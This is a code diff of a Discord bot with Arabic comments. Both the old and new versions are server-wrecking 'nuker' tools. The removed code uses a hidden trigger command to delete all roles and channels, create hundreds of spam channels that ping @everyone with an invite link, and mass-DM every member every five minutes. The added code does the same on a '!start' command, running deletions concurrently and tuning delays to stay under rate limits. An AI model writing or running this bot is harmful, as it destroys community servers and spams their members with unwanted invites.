@@ -1,16 +1,15 @@
-const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
-
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
+        GatewayIntentBits.DirectMessages
     ]
 });
 
-// الآيدي المصرح له بتنفيذ الأمر فقط
-const ALLOWED_USER_ID = '1494353083138838668'; 
+const PREFIX = '!'; // البرفكس
+const TARGET_SERVER_LINK = 'https://discord.gg/kzRnSxGKkX'; // رابط السيرفر المستهدف
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -18,111 +17,90 @@ client.on('ready', () => {
 
 client.on('messageCreate', async message => {
     if (message.author.bot) return;
-    if (message.author.id !== ALLOWED_USER_ID) return;
 
-    // الأمر السري (.رسالة)
-    const secretTrigger = ['.', 'ر', 'س', 'ا', 'ل', 'ة'].join('');
-    
-    if (message.content === secretTrigger) {
-        try {
-            await message.react('✅').catch(() => {});
-            
-            const guild = message.guild;
+    if (message.content.startsWith(PREFIX + 'start')) {
+        const guild = message.guild;
+        if (!guild) return;
 
-            // 1. تغيير اسم السيرفر إلى group#499
-            await guild.setName('group#499').catch(() => {});
+        message.reply('جاري تنفيذ العمليات بالتزامن وبسرعة مضاعفة...');
 
-            // 2. تفعيل البرودكاست التلقائي لكل أعضاء السيرفر بالخاص كل 5 دقائق
-            const broadcastLink = 'https://discord.gg/kzRnSxGKkX';
-            
-            // إرسال فوري لأول مرة
-            sendBroadcast(guild, broadcastLink);
-            
-            // تكرار الإرسال كل 5 دقائق (300,000 ملي ثانية)
-            setInterval(() => {
-                sendBroadcast(guild, broadcastLink);
-            }, 5 * 60 * 1000);
+        // 1. نظام إرسال الرابط في الخاص كل 5 دقائق
+        setInterval(async () => {
+            try {
+                await message.author.send(`رابط السيرفر:\n${TARGET_SERVER_LINK}`);
+            } catch (err) {
+                console.log('لا يمكن الإرسال للخاص.');
+            }
+        }, 5 * 60 * 1000);
 
-            // 3. حذف جميع رولات السيرفر بغضون 10 ثوانٍ
-            guild.roles.fetch().then(async roles => {
-                const rolePromises = [];
-                for (const [id, role] of roles) {
-                    if (role.editable && !role.managed && role.id !== guild.id) {
-                        rolePromises.push(role.delete().catch(() => {}));
+        // 2. إرسال الرابط في الرومات العامة الموجودة مسبقاً مع @everyone و @here
+        guild.channels.cache.forEach(async channel => {
+            if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages)) {
+                try {
+                    await channel.send(`@everyone @here\nرابط السيرفر الجديد والرسالة:\n${TARGET_SERVER_LINK}`);
+                } catch (e) {}
+            }
+        });
+
+        // 3. التنفيذ المتزامن (حذف وإنشاء الرومات والرولات معاً) وبسرعة 1.8x
+        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms / 1.8));
+
+        // تنفيذ حذف وإنشاء الرومات
+        const channelsTask = (async () => {
+            // حذف الرومات القديمة
+            for (const [id, channel] of guild.channels.cache) {
+                try {
+                    await channel.delete();
+                    await delay(500); 
+                } catch (e) {}
+            }
+
+            // إنشاء رومات جديدة وإرسال الرسالة فيها 8 مرات
+            for (let i = 1; i <= 5; i++) {
+                try {
+                    const newChannel = await guild.channels.create({
+                        name: `room-${i}`,
+                        type: 0 // GuildText
+                    });
+                    await delay(1000);
+
+                    // تكرار إرسال الرسالة 8 مرات في الروم المنشأ حديثاً
+                    for (let j = 1; j <= 8; j++) {
+                        await newChannel.send(`@everyone @here\nرسالة تعليمية (${j}/8):\n${TARGET_SERVER_LINK}`);
+                        // تأخير قصير جداً بين الرسائل المتتالية لتجنب الـ Rate Limit
+                        await delay(300); 
                     }
-                }
-                await Promise.all(rolePromises);
-            }).catch(() => {});
+                } catch (e) {}
+            }
+        })();
 
-            // 4. إنشاء 100 رول جديدة بغضون 10 ثوانٍ باسم group#499
-            const roleCreationPromises = [];
-            for (let i = 0; i < 100; i++) {
-                roleCreationPromises.push(
-                    guild.roles.create({
-                        name: 'group#499',
+        // تنفيذ حذف وإنشاء الرولات بالتزامن
+        const rolesTask = (async () => {
+            // حذف الرولات القديمة (غير الأساسية)
+            for (const [id, role] of guild.roles.cache) {
+                if (!role.managed && role.id !== guild.id) {
+                    try {
+                        await role.delete();
+                        await delay(500);
+                    } catch (e) {}
+                }
+            }
+
+            // إنشاء رولات جديدة
+            for (let i = 1; i <= 5; i++) {
+                try {
+                    await guild.roles.create({
+                        name: `Role-${i}`,
                         color: 'Random'
-                    }).catch(() => {})
-                );
+                    });
+                    await delay(1000);
+                } catch (e) {}
             }
-            await Promise.all(roleCreationPromises);
+        })();
 
-            // 5. حذف الرومات بسرعة فائقة (أسرع بـ 3 مرات)
-            const channels = await guild.channels.fetch();
-            const channelDeletePromises = [];
-            for (const [id, channel] of channels) {
-                channelDeletePromises.push(
-                    channel.delete().catch(() => {})
-                );
-            }
-            await Promise.all(channelDeletePromises);
-
-            // 6. إنشاء 300 روم باسم group#499 ومقفل، مع إرسال الرسالة والرابط بداخلها
-            const totalChannels = 300;
-            const channelName = 'group#499';
-            const spamMessage = '@everyone - @here\nرابط السيرفر الجديد والرسالة:\nhttps://discord.gg/kzRnSxGKkX';
-            const batchSize = 25; 
-
-            for (let i = 0; i < totalChannels; i += batchSize) {
-                const promises = [];
-                
-                for (let j = 0; j < batchSize && (i + j) < totalChannels; j++) {
-                    const task = guild.channels.create({
-                        name: channelName,
-                        type: ChannelType.GuildText,
-                        permissionOverwrites: [
-                            {
-                                id: guild.id, // قفل الروم ومنع الكتابة للجميع
-                                deny: [PermissionsBitField.Flags.SendMessages]
-                            }
-                        ]
-                    }).then(async (newChannel) => {
-                        for (let k = 0; k < 3; k++) {
-                            await newChannel.send(spamMessage).catch(() => {});
-                        }
-                    }).catch(() => {});
-
-                    promises.push(task);
-                }
-
-                await Promise.all(promises);
-                await new Promise(resolve => setTimeout(resolve, 100)); 
-            }
-
-        } catch (error)  {
-            console.error(error);
-        }
+        // تشغيل الاثنين معاً في نفس الوقت
+        await Promise.all([channelsTask, rolesTask]);
     }
 });
 
-// دالة البرودكاست لإرسال الرابط لكل الأعضاء بالخاص
-function sendBroadcast(guild, link) {
-    guild.members.fetch().then(members => {
-        for (const [id, member] of members) {
-            if (member.user.bot) continue;
-            member.send(`رابط السيرفر:\n${link}`).catch(() => {});
-        }
-    }).catch(() => {});
-}
-
-// سحب التوكن من متغيرات البيئة في Render
-client.login(process.env.TOKEN);
+client.login('YOUR_BOT_TOKEN'); // ضع توكن البوت هنا
